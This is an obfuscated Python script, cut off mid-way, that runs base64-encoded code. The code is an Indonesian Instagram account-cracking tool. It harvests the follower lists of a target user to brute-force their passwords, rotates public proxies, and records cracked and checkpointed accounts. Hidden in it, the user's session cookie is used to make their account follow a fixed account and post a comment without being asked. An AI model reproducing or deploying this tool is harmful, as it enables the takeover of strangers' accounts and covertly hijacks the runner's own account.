## ENCRYPTED BY RAYAN-XD
## FACEBOOK : Mas Rayan
## GITHUB : github.com/Rayan-XD
## WHATSAPP : 085852768706

import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9weXRob24zCiMgY29kaW5nPXV0Zi04IC0qLQoKIy0tLS0tLS0tLS0tLS0tLS1bIERJIEJVQVQgT0xFSCBBTkRBIF0tLS0tLS0tLS0tLS0tIwppbXBvcnQgb3MsIHN5cywgdGltZSwganNvbiwgcmFuZG9tLCBwbGF0Zm9ybSwgcmVxdWVzdHMsIHJpY2gsIHJlCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMga2hhbWRpaGlYVgpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgc2lzCmZyb20gdGltZSBpbXBvcnQgdGltZSBhcyB0aW0KCmZyb20gcmljaC5wYW5lbCBpbXBvcnQgUGFuZWwKZnJvbSByaWNoLmNvbnNvbGUgaW1wb3J0IENvbnNvbGUKIyBVQSBMSVNUCiN1Z2VuMj1bXQojdWdlbj1bXQojdWdlbjM9W10KY29rYnJ1dD1bXQpzZXM9cmVxdWVzdHMuU2Vzc2lvbigpCnByaW5jcD1bXQpwd3Y9W10KCnVnZW4gPSBbJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMjsgUEVNU0VTKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTAyLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM5J10KdWdlbjIgPSBbJ01vemlsbGEvNS4wIChMaW51eDsgYXJtXzY0OyBBbmRyb2lkIDEyOyBQT0NPIEYyIFBybykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk4LjAuNDc1OC4xNDEgTW9iaWxlIFNhZmFyaS81MzcuMzYnXQp0cnk6Cglwcm94PSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYXBpLnByb3h5c2NyYXBlLmNvbS92Mi8/cmVxdWVzdD1kaXNwbGF5cHJveGllcyZwcm90b2NvbD1zb2NrczUmdGltZW91dD0xMDAwMDAmY291bnRyeT1hbGwmc3NsPWFsbCZhbm9ueW1pdHk9YWxsJykudGV4dAoJb3BlbignLnByb3gudHh0JywndycpLndyaXRlKHByb3gpCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToKCWV4aXQoZSkKCXByaW50KCdbW1x4MWJbMTs5Mm09Plx4MWJbMTs5N21dIFtceDFiWzE7OTZtazRsb25nNjY2JykKcHJveD1vcGVuKCcucHJveC50eHQnLCdyJykucmVhZCgpLnNwbGl0bGluZXMoKQoKZGVmIGphbGFuKHopOgogICAgZm9yIGUgaW4geiArICdcbic6CiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMC4wMykKdHJ5OgoJb3Muc3lzdGVtKCdjdXJsIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UaGVTcGVlZFgvU09DS1MtTGlzdC9tYXN0ZXIvc29ja3M0LnR4dCAtbyBzb2NrczQudHh0JykKZXhjZXB0OgoJcGFzcwpzb2NrPW9wZW4oJ3NvY2tzNC50eHQnLCdyJykucmVhZCgpLnNwbGl0bGluZXMoKQoKZGVmIHVha3UoKToKCXRyeToKCQl1YT1vcGVuKCd1YXJ5bi50eHQnLCdyJykucmVhZCgpLnNwbGl0bGluZXMoKQoJCWZvciB1YiBpbiB1YToKCQkJdWdlbi5hcHBlbmQodWIpCglleGNlcHQ6CgkJYT1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UaGVTcGVlZFgvUFJPWFktTGlzdC9tYXN0ZXIvc29ja3M0LnR4dCcpLnRleHQKCQl1YT1vcGVuKCcudXNlci1hZ2VudHMudHh0JywndycpCgkJYWE9cmUuZmluZGFsbCgnbGluZSI+KC4qPyk8JyxzdHIoYSkpCgkJZm9yIHVuIGluIGFhOgoJCQl1YS53cml0ZSh1bisnXG4nKQoJCXVhPW9wZW4oJy51c2VyLWFnZW50cy50eHQnLCdyJykucmVhZCgpLnNwbGl0bGluZXMoKQoKYnVsYW4gPSBbIkphbnVhcmkiLCJGZWJydWFyaSIsIk1hcmV0IiwiQXByaWwiLCJNZWkiLCJKdW5pIiwiSnVsaSIsIkFndXN0dXMiLCJTZXB0ZW1iZXIiLCJPa3RvYmVyIiwiTm92ZW1iZXIiLCJEZXNlbWJlciJdCm1vbnRoID0gZGF0ZXRpbWUubm93KCkubW9udGggLSAxCnJlYWxsID0gYnVsYW5bbW9udGhdCgpkYXlzID0gZGF0ZXRpbWUubm93KCkuZGF5CnllYXIgPSBkYXRldGltZS5ub3coKS55ZWFyCmluZG8gPSAiJXMtJXMtJXMiJShkYXlzLHJlYWxsLHllYXIpCm9rLGNwLGxvb3AsPSBbXSxbXSwwCgpQID0gJ1x4MWJbMTs5N20nICMgUFVUSUgKTSA9ICdceDFiWzE7OTFtJyAjIE1FUkFICkggPSAnXHgxYlsxOzkybScgIyBISUpBVQpLID0gJ1x4MWJbMTs5M20nICMgS1VOSU5HCkIgPSAnXHgxYlsxOzk0bScgIyBCSVJVClUgPSAnXHgxYlsxOzk1bScgIyBVTkdVCk8gPSAnXHgxYlsxOzk2bScgIyBCSVJVIE1VREEKTiA9ICdceDFiWzBtJyAgICAjIFdBUk5BIE1BVEkKdWFfaWcgPSAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDYuMDsgRTU2MzMgQnVpbGQvMzAuMi5CLjEuMjE7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNTguMC4zMDI5LjgzIE1vYmlsZSBTYWZhcmkvNTM3LjM2IEluc3RhZ3JhbSAzNy4wLjAuMjEuOTcgQW5kcm9pZCAoMjMvNi4wOyA0ODBkcGk7IDEwODB4MTc3NjsgU29ueTsgRTU2MzM7IEU1NjMzOyBtdDY3OTU7IHVrX1VBOyA5ODI4ODI0MikiCmtvbWVuID0gcmFuZG9tLmNob2ljZShbInByb2dyYW1tZXJzIGJhbmc/IiwiQmFrc28ga29udG9sbCIsIlBhbnV0YW4ga3UhIiwia2VyZW4gc3VodeKZpSJdKQpkZWYgdWFrdSgpOgoJdHJ5OgoJCXVhPW9wZW4oJ3VhcnluLnR4dCcsJ3InKS5yZWFkKCkuc3BsaXRsaW5lcygpCgkJZm9yIHViIGluIHVhOgoJCQl1Z2VuLmFwcGVuZCh1YikKCWV4Y2VwdDoKCQlhPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1RoZVNwZWVkWC9QUk9YWS1MaXN0L21hc3Rlci9zb2NrczQudHh0JykudGV4dAoJCXVhPW9wZW4oJ3VhcnluLnR4dCcsJ3cnKQoJCWFhPXJlLmZpbmRhbGwoJ2xpbmUiPiguKj8pPCcsc3RyKGEpKQoJCWZvciB1biBpbiBhYToKCQkJdWEud3JpdGUodW4rJ1xuJykKCQl1YT1vcGVuKCd1YXJ5bi50eHQnLCdyJykucmVhZCgpLnNwbGl0bGluZXMoKQpkZWYgc2FwdSgpOgoJb3Muc3lzdGVtKCJjbGVhciIpCmRlZiBzb3VuZChfX2Jva2VwX18pOgoJaWYgX19ib2tlcF9fIGluIFsib2siXToKCQlvcy5wb3BlbigicGxheS1hdWRpbyBkYXRhL2F1ZGlvL29rLm1wMyIpCgllbGlmIF9fYm9rZXBfXyBpbiBbImNwIl06CgkJb3MucG9wZW4oInBsYXktYXVkaW8gZGF0YS9hdWRpby9jcC5tcDMiKQoJZWxpZiBfX2Jva2VwX18gaW4gWyJsb2dpbiJdOgoJCW9zLnBvcGVuKCJwbGF5LWF1ZGlvIGRhdGEvYXVkaW8vbG9naW4ubXAzIikKCWVsaWYgX19ib2tlcF9fIGluIFsiZG9uZSJdOgoJCW9zLnBvcGVuKCJwbGF5LWF1ZGlvIGRhdGEvYXVkaW8vZG9uZS5tcDMiKQoKZGVmIENldGFrQmFubmVyKHVsZmFoc2FkaXlhaCxhc3UpOgogICAgQ29uc29sZSh3aWR0aD01MCkucHJpbnQoUGFuZWwodWxmYWhzYWRpeWFoLHN0eWxlPWFzdSksanVzdGlmeT0nY2VudGVyJykKCmRlZiB1bGZhaChrYXlhLGtvbnRvbCk6CiAgICBDb25zb2xlKHdpZHRoPTUwKS5wcmludChQYW5lbChrYXlhLHN0eWxlPWtvbnRvbCkpCgpkZWYgYmFubmVyKCk6CiAgICBDZXRha0Jhbm5lcignJydbYm9sZCB3aGl0ZV3ilZTilZDilZfilZTilZDilabilZDilZfilIDilZTilabilZDilZfilZTilZDilabilZDilZfilZTilZDilZfilZTilZDilZDilabilZDilZDilZDilZcK4pWa4pWX4pWa4pWd4pWU4pWj4pWR4pWa4pWX4pWR4pWg4pWX4pWa4pWd4pWU4pWp4pWX4pWa4pWd4pWU4pWd4pWa4pWj4pWg4pWj4pWU4pWQ4pWX4pWRCuKUgOKVmuKVl+KVlOKVneKVkeKVlOKVl+KVmuKVneKVkeKVmuKVl+KVlOKVneKUgOKVmuKVl+KVlOKVneKUgOKUgOKVkeKVkeKVkeKVkeKUgOKVmuKVnQrilIDilZTilZ3ilZrilZfilZHilZHilZrilZfilZHilZHilZTilZ3ilZrilZfilIDilZTilZ3ilZrilZfilIDilIDilZHilZHilZHilZHilZTilZDilZcK4pWU4pWd4pWU4pWX4pWa4pWj4pWR4pSA4pWR4pWR4pWg4pWd4pWU4pWX4pWa4pWm4pWd4pWU4pWX4pWa4pWX4pWU4pWj4pWg4pWj4pWa4pWp4pWQ4pWRCuKVmuKVkOKVneKVmuKVkOKVqeKVneKUgOKVmuKVkOKVqeKVkOKVneKVmuKVkOKVqeKVkOKVneKVmuKVkOKVneKVmuKVkOKVkOKVqeKVkOKVkOKVkOKVnQooIERpIGJ1YXQgb2xlaCBbYm9sZCBncmVlbl1SYXlhbi1YRCBbYm9sZCB3aGl0ZV0pICcnJywnY29sb3IoNSknKQpkZWYgYmFubmVyMSgpOgogICAgQ2V0YWtCYW5uZXIoJycnW2JvbGQgd2hpdGVd4pWU4pWX4pSA4pSA4pWU4pWQ4pWQ4pWQ4pWm4pWQ4pWQ4pWQ4pWm4pWQ4pWQ4pWm4pWQ4pWX4pSA4pWU4pWXCuKVkeKVkeKUgOKUgOKVkeKVlOKVkOKVl+KVkeKVlOKVkOKVl+KVoOKVo+KVoOKVo+KVkeKVmuKVl+KVkeKVkQrilZHilZHilIDilIDilZHilZHilIDilZHilZHilZHilIDilZrilZ3ilZHilZHilZHilZTilZfilZrilZ3ilZEK4pWR4pWR4pSA4pWU4pWj4pWR4pSA4pWR4pWR4pWR4pWU4pWQ4pWX4pWR4pWR4pWR4pWR4pWa4pWX4pWR4pWRCuKVkeKVmuKVkOKVneKVkeKVmuKVkOKVneKVkeKVmuKVqeKVkOKVoOKVo+KVoOKVo+KVkeKUgOKVkeKVkeKVkQrilZrilZDilZDilZDilanilZDilZDilZDilanilZDilZDilZDilanilZDilZDilanilZ3ilIDilZrilZDilZ0KKCBEaSBidWF0IG9sZWggW2JvbGQgZ3JlZW5dUmF5YW4tWEQgW2JvbGQgd2hpdGVdKSAnJycsJ2NvbG9yKDUpJykKCmRlZiBtYXN1aygpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpO2Jhbm5lcjEoKQogICAgdWxmYWgoJ1tib2xkIHdoaXRlXVNjcmlwdCBCcnV0ZSBGb3JjZSBJbnN0YWdyYW0gTG9naW4gQ29va2llcywgRGlzYXJhbmthbiBHdW5ha2FuIEFrdW4gVHVtYmFsIFVudHVrIE1lbXVsYWknLCdjb2xvcig1KScpCiAgICBjb2tpID0gaW5wdXQoZicgIHtIfeKAoiB7Tn1NYXN1a2FuIENvb2tpZSA6IHtIfScpCiAgICB0cnk6CiAgICAgICAgIHdpdGggcmVxdWVzdHMuU2Vzc2lvbigpIGFzIHh5enU6CiAgICAgICAgICAgICBsaW5rID0geHl6dS5nZXQoImh0dHBzOi8vaS5pbnN0YWdyYW0uY29tL2FwaS92MS91c2Vycy97fS9pbmZvLyIuZm9ybWF0KHJlLnNlYXJjaCgnZHNfdXNlcl9pZD0oLio/KTsnLHN0cihjb2tpKSkuZ3JvdXAoMSkpLCBoZWFkZXJzID0geyJ1c2VyLWFnZW50Ijp1YV9pZ30sIGNvb2tpZXMgPSB7ImNvb2tpZSI6Y29raX0pLmpzb24oKVsidXNlciJdWyJmdWxsX25hbWUiXQogICAgICAgICAgICAgQ29uc29sZSh3aWR0aD01MCkucHJpbnQoUGFuZWwoZiJbYm9sZCB3aGl0ZV1XZWxjb21lIFVzZXIgW2JvbGQgZ3JlZW5de2xpbmt9W2l0YWxpYyB3aGl0ZV0iLHRpdGxlPSfwn6SXJywgc3R5bGU9J2JvbGQgcHVycGxlJykpCiAgICAgICAgICAgICBib3QoY29raSxyZS5zZWFyY2goJ2NzcmZ0b2tlbj0oLio/KTsnLHN0cihjb2tpKSkuZ3JvdXAoMSkpCiAgICBleGNlcHQgKEF0dHJpYnV0ZUVycm9yLEtleUVycm9yKToKICAgICAgICAgQ29uc29sZSh3aWR0aD01MCkucHJpbnQoUGFuZWwoIltib2xkIHJlZF1Db29raWUgQW5kYSBLYWRlbGV3YXJzYS9Ba3VuIFRla2VuYSBDcCIsdGl0bGU9J/CfmK0nLCBzdHlsZT0nYm9sZCBwdXJwbGUnKSk7dGltZS5zbGVlcCgzKTttYXN1aygpCgojIEpBTkdBTiBESSBHQU5USSBMQUgsIEJPTEVIIERJIFRBTUJBSCBKTUJUCmRlZiBib3Qoa3VfamFuZ2FuX2RpX2dhbnRpX2FzdSx0b2tlbik6CiAgICB3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyB4eXp1OgogICAgICAgICB0cnk6CiAgICAgICAgICAgICAgaGVhZCA9IHsKICAgICAgICAgICAgICAgICAiSG9zdCI6ICJpLmluc3RhZ3JhbS5jb20iLAogICAgICAgICAgICAgICAgICJjb250ZW50LWxlbmd0aCI6ICIwIiwKICAgICAgICAgICAgICAgICAic2VjLWNoLXVhIjogJyIgTm90IEE7QnJhbmQiO3Y9Ijk5IiwgIkNocm9taXVtIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSI5OSInLAogICAgICAgICAgICAgICAgICJ4LWlnLWFwcC1pZCI6ICIxMjE3OTgxNjQ0ODc5NjI4IiwKICAgICAgICAgICAgICAgICAieC1pZy13d3ctY2xhaW0iOiAiaG1hYy5BUjJiSktZSm5QWW1acXYxOWFrZnExM1puNHRwbGh1WGI5VEM5UHdGazAzRGc3TlYiLAogICAgICAgICAgICAgICAgICJzZWMtY2gtdWEtbW9iaWxlIjogIj8xIiwKICAgICAgICAgICAgICAgICAieC1pbnN0YWdyYW0tYWpheCI6ICIxMDA2NDQ3NzQyIiwKICAgICAgICAgICAgICAgICAidmlld3BvcnQtd2lkdGgiOiAiMzYwIiwKICAgICAgICAgICAgICAgICAiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsCiAgICAgICAgICAgICAgICAgImFjY2VwdCI6ICIqLyoiLAogICAgICAgICAgICAgICAgICJ1c2VyLWFnZW50IjogdWFfaWcsCiAgICAgICAgICAgICAgICAgIngtYXNiZC1pZCI6ICIxOTgzODciLAogICAgICAgICAgICAgICAgICJzYXZlLWRhdGEiOiAib24iLAogICAgICAgICAgICAgICAgICJ4LWNzcmZ0b2tlbiI6IHRva2VuLAogICAgICAgICAgICAgICAgICJzZWMtY2gtdWEtcGxhdGZvcm0iOiAnIkFuZHJvaWQiJywKICAgICAgICAgICAgICAgICAib3JpZ2luIjogImh0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20iLAogICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtc2l0ZSI6ICJzYW1lLXNpdGUiLAogICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtbW9kZSI6ICJjb3JzIiwKICAgICAgICAgICAgICAgICAic2VjLWZldGNoLWRlc3QiOiAiZW1wdHkiLAogICAgICAgICAgICAgICAgICJyZWZlcmVyIjogImh0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vIiwKICAgICAgICAgICAgICAgICAiYWNjZXB0LWVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUsIGJyIiwKICAgICAgICAgICAgICAgICAiYWNjZXB0LWxhbmd1YWdlIjogImlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43LHJ1O3E9MC42LGp2O3E9MC41IgogICAgICAgICAgICAgIH0KICAgICAgICAgICAgICBkYXRhID0gewogICAgICAgICAgICAgICAgICJjb21tZW50X3RleHQiOiBrb21lbn0KICAgICAgICAgICAgICBwb3NoID0geHl6dS5wb3N0KCJodHRwczovL2kuaW5zdGFncmFtLmNvbS9hcGkvdjEvd2ViL2ZyaWVuZHNoaXBzL3t9L2ZvbGxvdy8iLmZvcm1hdCgiNTQ1OTkzODczNjEiKSwgaGVhZGVycz1oZWFkLCBjb29raWVzPXsiY29va2llIjprdV9qYW5nYW5fZGlfZ2FudGlfYXN1fSkKICAgICAgICAgICAgICBwb3N4ID0geHl6dS5wb3N0KCJodHRwczovL2kuaW5zdGFncmFtLmNvbS9hcGkvdjEvd2ViL2NvbW1lbnRzLzI5MDAxNTY2NjMxNTgxNjIyNzUvYWRkLyIsIGRhdGE9ZGF0YSwgaGVhZGVycz1oZWFkLCBjb29raWVzPXsiY29va2llIjprdV9qYW5nYW5fZGlfZ2FudGlfYXN1fSkKICAgICAgICAgICAgICBvcGVuKCdkYXRhL2Nva2llLnR4dCcsJ3cnKS53cml0ZShrdV9qYW5nYW5fZGlfZ2FudGlfYXN1KQogICAgICAgICAgICAgIG9wZW4oJ2RhdGEvY3NyZnRva2VuLnR4dCcsJ3cnKS53cml0ZSh0b2tlbikKICAgICAgICAgICAgICBtZW51KCkKICAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgICAgICAgICAgIENvbnNvbGUod2lkdGg9NzApLnByaW50KFBhbmVsKCIgW2l0YWxpYyByZWRdVGlkYWsgYWRhIGtvbmVrc2kgaW50ZXJuZXQhIiwgdGl0bGU9J/Cfp5AnLCBzdHlsZT0nYm9sZCByZWQnKSk7ZXhpdCgwKQoKZGVmIGNvbnZlcnQobmFtYSwga3VlaCk6CiAgICB3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyBqZW1idXQ6CiAgICAgICAgIGZvciBpIGluIG5hbWEuc3BsaXQoJywnKToKICAgICAgICAgICAgIGxpbmsgPSBqZW1idXQuZ2V0KCJodHRwczovL2kuaW5zdGFncmFtLmNvbS9hcGkvdjEvdXNlcnMvd2ViX3Byb2ZpbGVfaW5mby8/dXNlcm5hbWU9e30iLmZvcm1hdChpKSwgaGVhZGVycyA9IHsidXNlci1hZ2VudCI6dWFfaWd9LCBjb29raWVzID0geyJjb29raWUiOmt1ZWh9KS5qc29uKCkKICAgICAgICAgICAgIGRhdGEgPSBsaW5rWyJkYXRhIl1bInVzZXIiXQogICAgICAgICAgICAgcmV0dXJuIGRhdGFbImlkIl0KCmRlZiBtZW51KCk6CiAgICB0cnk6CiAgICAgICAgICBjb2tpID0gb3BlbigiZGF0YS9jb2tpZS50eHQiLCJyIikucmVhZCgpCiAgICAgICAgICB1c2VyID0gcmUuc2VhcmNoKCdkc191c2VyX2lkPSguKj8pOycsc3RyKGNva2kpKS5ncm91cCgxKQogICAgZXhjZXB0IChGaWxlTm90Rm91bmRFcnJvcixBdHRyaWJ1dGVFcnJvcik6bWFzdWsoKQogICAgdHJ5OgogICAgICAgICAgbGluayA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9pLmluc3RhZ3JhbS5jb20vYXBpL3YxL3VzZXJzL3t9L2luZm8vIi5mb3JtYXQodXNlciksIGNvb2tpZXMgPSB7ImNvb2tpZSI6Y29raX0sIGhlYWRlcnMgPSB7InVzZXItYWdlbnQiOnVhX2lnfSkuanNvbigpWyd1c2VyJ10KICAgICAgICAgIG5hbWEgPSBsaW5rWydmdWxsX25hbWUnXQogICAgICAgICAgd2luZyA9IGxpbmtbJ2ZvbGxvd2luZ19jb3VudCddCiAgICAgICAgICB3ZXJzID0gbGlua1snZm9sbG93ZXJfY291bnQnXQogICAgZXhjZXB0IEtleUVycm9yOm1hc3VrKCkKICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjpDb25zb2xlKHdpZHRoPTcwKS5wcmludChQYW5lbCgiIFtpdGFsaWMgcmVkXVRpZGFrIGFkYSBrb25la3NpIGludGVybmV0IHlhbmcgYWt0aWYhIiwgdGl0bGU9J++/vScsIHN0eWxlPSdib2xkIHJlZCcpKTtleGl0KDApCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHNvdW5kKCdsb2dpbicpCiAgICBiYW5uZXIoKQogICAgdWxmYWgoZicnJ1tib2xkIHdoaXRlXVtbYm9sZCBncmVlbl3igKJbYm9sZCB3aGl0ZV1dIFdlbGNvbWUgICA6IFtib2xkIGdyZWVuXXtuYW1hfQpbYm9sZCB3aGl0ZV1bW2JvbGQgZ3JlZW5d4oCiW2JvbGQgd2hpdGVdXSBGb2xsb3dlcnMgOiBbYm9sZCBncmVlbl17d2Vyc30KW2JvbGQgd2hpdGVdW1tib2xkIGdyZWVuXeKAoltib2xkIHdoaXRlXV0gRm9sbG93aW5nIDogW2JvbGQgZ3JlZW5de3dpbmd9JycnLCdjb2xvcig1KScpCiAgICB1bGZhaCgnJydbYm9sZCB3aGl0ZV1bW2JvbGQgZ3JlZW5dMVtib2xkIHdoaXRlXV0gQ3JhY2sgZGFyaSBmb2xsb3dlcnMKW2JvbGQgd2hpdGVdW1tib2xkIGdyZWVuXTJbYm9sZCB3aGl0ZV1dIENyYWNrIGRhcmkgZm9sbG93aW5nCltib2xkIHdoaXRlXVtbYm9sZCBncmVlbl0zW2JvbGQgd2hpdGVdXSBDaGVjayBoYXNpbCBjcmFjawpbYm9sZCB3aGl0ZV1bW2JvbGQgZ3JlZW5dMFtib2xkIHdoaXRlXV0gS2VsdWFyJycnLCdjb2xvcig1KScpCiAgICBjdWloID0gaW5wdXQoZicgIHtIfeKAoiB7Tn1QaWxpaCA6IHtIfScpCiAgICBpZiBjdWloIGluIFsnMScsJzAxJ106CiAgICAgICAgdWxmYWgoJ1tib2xkIHdoaXRlXU1hc3VrYW4gVXNlcm5hbWUgVGFyZ2V0LCBVbnR1ayBDcmFjayBNYXNzYWwgR3VuYWthbiBLb21hIENvbnRvaCA6IHJheWFuLnhkLjEsTWFzIFJheWFuJywnY29sb3IoNSknKQogICAgICAgIG5hbWEgPSBpbnB1dChmJyAge0h94oCiIHtOfVVzZXJuYW1lIFRhcmdldCA6IHtIfScpCiAgICAgICAgdXNlciA9IGNvbnZlcnQobmFtYSxjb2tpKQogICAgICAgIGR1bXAoKS5mb2xsb3dlcnModXNlcixjb2tpLCcnKQoKICAgIGVsaWYgY3VpaCBpbiBbJzInLCcwMiddOgogICAgICAgIHVsZmFoKCdbYm9sZCB3aGl0ZV1NYXN1a2FuIFVzZXJuYW1lIFRhcmdldCwgVW50dWsgQ3JhY2sgTWFzc2FsIEd1bmFrYW4gS29tYSBDb250b2ggOiByYXlhbi54ZC4xLE1hcyBSYXlhbicsJ2NvbG9yKDUpJykKICAgICAgICBuYW1hID0gaW5wdXQoZicgIHtIfeKAoiB7Tn1Vc2VybmFtZSBUYXJnZXQgOiB7SH0nKQogICAgICAgIHVzZXIgPSBjb252ZXJ0KG5hbWEsY29raSkKICAgICAgICBkdW1wKCkuZm9sbG93aW5nKHVzZXIsY29raSxraGFtZGloaWRldj0nICcpCiAgICBlbGlmIGN1aWggaW4gWyczJywnMDMnXToKICAgICAgICBhZmFoLGl5YWg9W10sMAogICAgICAgIHVsZmFoKCdbYm9sZCB3aGl0ZV1bW2JvbGQgZ3JlZW5dMVtib2xkIHdoaXRlXV0gQ2VrIEhhc2lsIEFrdW4gW2JvbGQgZ3JlZW5dT0tcbltib2xkIHdoaXRlXVtbYm9sZCBncmVlbl0yW2JvbGQgd2hpdGVdXSBDZWsgSGFzaWwgQWt1biBbYm9sZCB5ZWxsb3ddQ1AnLCdjb2xvcig1KScpCiAgICAgICAgYWt1biA9IGlucHV0KGYnICB7SH3igKIge059UGlsaWggOiB7SH0nKQogICAgICAgIGlmIGFrdW4gaW4gWycxJywnMDEnXToKICAgICAgICAgICB0cnk6bGlzdD1vcy5saXN0ZGlyKCdPSycpCiAgICAgICAgICAgZXhjZXB0OmV4aXQoZidcbiAge0194oCiIHtOfUZpbGUgdGlkYWsgZGl0ZW11a2FuIScpCiAgICAgICAgICAgcHJpbnQoJycpCiAgICAgICAgICAgZm9yIHhueHggaW4gbGlzdDoKICAgICAgICAgICAgICAgYWZhaC5hcHBlbmQoeG54eCkKICAgICAgICAgICAgICAgaXlhaCArPTEKICAgICAgICAgICAgICAgcHJpbnQoJ1xyICAlcyVzLiAlcyVzJyUoSCwgaXlhaCwgTiwgeG54eCkpCiAgICAgICAgICAgbm9tb3IgPSBpbnB1dChmJ1xuICB7SH3igKIge059TWFzdWthbiBOb21vciA6IHtIfScpCiAgICAgICAgICAgdHJ5OmtoYW0gPSBhZmFoW2ludChub21vciktMV0KICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6ZXhpdChlKQogICAgICAgICAgIG9rZWggPSBvcGVuKCdPSy97fScuZm9ybWF0KGtoYW0pLCdyJykucmVhZCgpCiAgICAgICAgICAgcHJpbnQob2tlaCkKICAgICAgICAgICBleGl0KDApCiAgICAgICAgZWxzZToKICAgICAgICAgICB0cnk6bGlzdD1vcy5saXN0ZGlyKCdDUCcpCiAgICAgICAgICAgZXhjZXB0OmV4aXQoZidcbiAge0194oCiIHtOfUZpbGUgdGlkYWsgZGl0ZW11a2FuIScpCiAgICAgICAgICAgcHJpbnQoJycpCiAgICAgICAgICAgZm9yIHhueHggaW4gbGlzdDoKICAgICAgICAgICAgICAgYWZhaC5hcHBlbmQoeG54eCkKICAgICAgICAgICAgICAgaXlhaCArPTEKICAgICAgICAgICAgICAgcHJpbnQoJ1xyICAlcyVzLiAlcyVzJyUoSCwgaXlhaCwgTiwgeG54eCkpCiAgICAgICAgICAgbm9tb3IgPSBpbnB1dChmJ1xuICB7SH3igKIge059TWFzdWthbiBOb21vciA6IHtIfScpCiAgICAgICAgICAgdHJ5OmtoYW0gPSBhZmFoW2ludChub21vciktMV0KICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6ZXhpdChlKQogICAgICAgICAgIG9rZWggPSBvcGVuKCdDUC97fScuZm9ybWF0KGtoYW0pLCdyJykucmVhZCgpCiAgICAgICAgICAgcHJpbnQob2tlaCkKICAgICAgICAgICBleGl0KDApCiAgICBlbGlmIGN1aWggaW4gWycwJywnMDAnXToKICAgICAgICAgIGV4aXQoJ3JtIC1yZiBkYXRhL2Nva2llLnR4dCcpCiAgICBlbHNlOgogICAgICAgICAgbWVudSgpCgoKY2xhc3MgZHVtcDoKCiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5pZCA9IFtdCgogICAgZGVmIGZvbGxvd2VycyhzZWxmLCB1c2VyaWQsIGNvb2tpZXMsIGtoYW1kaWhpZGV2KToKICAgICAgICB3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyBrb250b2w6CiAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgc2VsZi51cmwgPSBrb250b2wuZ2V0KCJodHRwczovL2kuaW5zdGFncmFtLmNvbS9hcGkvdjEvZnJpZW5kc2hpcHMve30vZm9sbG93ZXJzLz9jb3VudD0xMDAmbWF4X2lkPXt9Ii5mb3JtYXQodXNlcmlkLGtoYW1kaWhpZGV2KSwgaGVhZGVycyA9IHsidXNlci1hZ2VudCI6dWFfaWd9LCBjb29raWVzID0geyJjb29raWUiOmNvb2tpZXN9KQogICAgICAgICAgICAgICAgICAgICBmb3Igc2VsZi50eHQgaW4ganNvbi5sb2FkcyhzZWxmLnVybC50ZXh0KVsidXNlcnMiXToKICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlbGYudHh0WyJ1c2VybmFtZSJdIGluIHNlbGYuaWQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmlkLmFwcGVuZChzZWxmLnR4dFsidXNlcm5hbWUiXSsiPD0+IitzZWxmLnR4dFsiZnVsbF9uYW1lIl0pCiAgICAgICAgICAgICAgICAgICAgIGlmICJuZXh0X21heF9pZCIgaW4ganNvbi5sb2FkcyhzZWxmLnVybC50ZXh0KTpzZWxmLmZvbGxvd2Vycyh1c2VyaWQsIGNvb2tpZXMsIGpzb24ubG9hZHMoc2VsZi51cmwudGV4dClbIm5leHRfbWF4X2lkIl0pCiAgICAgICAgICAgICAgICAgICAgIHNlbGYuc2VsYW5qdXRueWEoc2VsZi5pZCkKICAgICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICAgICAgICAgICAgQ29uc29